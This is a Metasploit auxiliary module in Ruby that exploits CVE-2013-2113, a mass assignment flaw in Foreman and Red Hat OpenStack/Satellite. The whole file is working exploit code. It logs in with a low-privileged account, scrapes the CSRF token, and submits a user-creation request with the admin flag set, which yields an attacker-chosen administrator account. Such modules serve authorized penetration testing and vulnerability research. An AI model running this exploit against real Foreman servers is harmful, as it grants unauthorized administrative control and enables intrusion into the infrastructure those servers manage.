 
class Metasploit4 < Msf::Auxiliary
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize
    super(
      &#039;Name&#039;           => &#039;Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a mass assignment vulnerability in the &#039;create&#039;
        action of &#039;users&#039; controller of Foreman and Red Hat OpenStack/Satellite
        (Foreman 1.2.0-RC1 and earlier) by creating an arbitrary administrator
        account. For this exploit to work, your account must have &#039;create_users&#039;
        permission (e.g., Manager role).
      },
      &#039;Author&#039;         => &#039;Ramon de C Valle&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;60835&#039;],
          [&#039;CVE&#039;, &#039;2013-2113&#039;],
          [&#039;CWE&#039;, &#039;915&#039;],
          [&#039;OSVDB&#039;, &#039;94655&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=966804&#039;],
          [&#039;URL&#039;, &#039;http://projects.theforeman.org/issues/2630&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 6 2013&#039;
    )
 
    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Your username&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Your password&#039;]),
        OptString.new(&#039;NEWUSERNAME&#039;, [true, &#039;The username of the new admin account&#039;]),
        OptString.new(&#039;NEWPASSWORD&#039;, [true, &#039;The password of the new admin account&#039;]),
        OptString.new(&#039;NEWEMAIL&#039;, [true, &#039;The email of the new admin account&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to the application&#039;, &#039;/&#039;]),
      ], self.class
    )
  end
 
  def run
    print_status("Logging into #{target_url}...")
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;users&#039;, &#039;login&#039;),
      &#039;vars_post&#039; => {
        &#039;login[login]&#039;    => datastore[&#039;USERNAME&#039;],
        &#039;login[password]&#039; => datastore[&#039;PASSWORD&#039;]
      }
    )
 
    if res.nil?
      print_error(&#039;No response from remote host&#039;)
      return
    end
 
    if res.headers[&#039;Location&#039;] =~ /users\/login$/
      print_error(&#039;Authentication failed&#039;)
      return
    else
      session = $1 if res.headers[&#039;Set-Cookie&#039;] =~ /_session_id=([0-9a-f]*)/
 
      if session.nil?
        print_error(&#039;Failed to retrieve the current session id&#039;)
        return
      end
    end
 
    print_status(&#039;Retrieving the CSRF token for this session...&#039;)
    res = send_request_cgi(
      &#039;cookie&#039; => "_session_id=#{session}",
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri)
    )
 
    if res.nil?
      print_error(&#039;No response from remote host&#039;)
      return
    end
 
    if res.headers[&#039;Location&#039;] =~ /users\/login$/
      print_error(&#039;Failed to retrieve the CSRF token&#039;)
      return
    else
      csrf_param = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-param"[ ]*\/?>/i
      csrf_token = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-token"[ ]*\/?>/i
 
      if csrf_param.nil? || csrf_token.nil?
        csrf_param = $1 if res.body =~ /<meta[ ]+name="csrf-param"[ ]+content="(.*)"[ ]*\/?>/i
        csrf_token = $1 if res.body =~ /<meta[ ]+name="csrf-token"[ ]+content="(.*)"[ ]*\/?>/i
      end
 
      if csrf_param.nil? || csrf_token.nil?
        print_error(&#039;Failed to retrieve the CSRF token&#039;)
        return
      end
    end
 
    print_status("Sending create-user request to #{target_url(&#039;users&#039;)}...")
    res = send_request_cgi(
      &#039;cookie&#039;    => "_session_id=#{session}",
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;users&#039;),
      &#039;vars_post&#039; => {
        csrf_param                    => csrf_token,
        &#039;user[admin]&#039;                 => &#039;true&#039;,
        &#039;user[auth_source_id]&#039;        => &#039;1&#039;,
        &#039;user[login]&#039;                 => datastore[&#039;NEWUSERNAME&#039;],
        &#039;user[mail]&#039;                  => datastore[&#039;NEWEMAIL&#039;],
        &#039;user[password]&#039;              => datastore[&#039;NEWPASSWORD&#039;],
        &#039;user[password_confirmation]&#039; => datastore[&#039;NEWPASSWORD&#039;]
      }
    )
 
    if res.nil?
      print_error(&#039;No response from remote host&#039;)
      return
    end
 
    if res.headers[&#039;Location&#039;] =~ /users$/
      print_good(&#039;User created successfully&#039;)
    else
      print_error(&#039;Failed to create user&#039;)
    end
  end
 
  def target_url(*args)
    (ssl ? &#039;https&#039; : &#039;http&#039;) +
      if rport.to_i == 80 || rport.to_i == 443
        "://#{vhost}"
      else
        "://#{vhost}:#{rport}"
      end + normalize_uri(target_uri.path, *args)
  end
end

